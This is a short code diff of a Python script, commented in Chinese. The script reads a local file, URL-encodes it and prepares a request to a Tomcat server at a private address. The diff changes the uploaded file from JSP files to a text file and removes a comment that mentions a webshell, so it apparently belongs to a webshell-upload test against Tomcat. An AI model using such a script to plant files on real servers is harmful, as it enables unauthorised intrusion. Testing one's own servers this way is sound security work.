@@ -12,22 +12,17 @@ def read_file(file_path):
 # 读取 index.jsp 文件的内容
 CURRENT_DIR = Path(__file__).parent
 # file_path = CURRENT_DIR / 'index.jsp'
-# file_path = CURRENT_DIR / 'tide-sec.jsp'
-file_path = CURRENT_DIR / "tomcat_origin.jsp"
+file_path = CURRENT_DIR / "testFile.txt"
+
 content = read_file(file_path)
 # encoded_content = content.encode('utf-8')
 content_encoded = urllib.parse.quote(content)
 
-# 打印内容以验证
-# print(content)
-
-
 # 设置请求的 URL
 url = "http://192.168.1.215:8080/"
 
-# content = "eval(self.webshell_txt_+ self.num)"
 # filename = "/index.jsp"
-filename = "/tomcat_origin.jsp"
+filename = "/testFile.txt"
 
 
 # 设置请求头
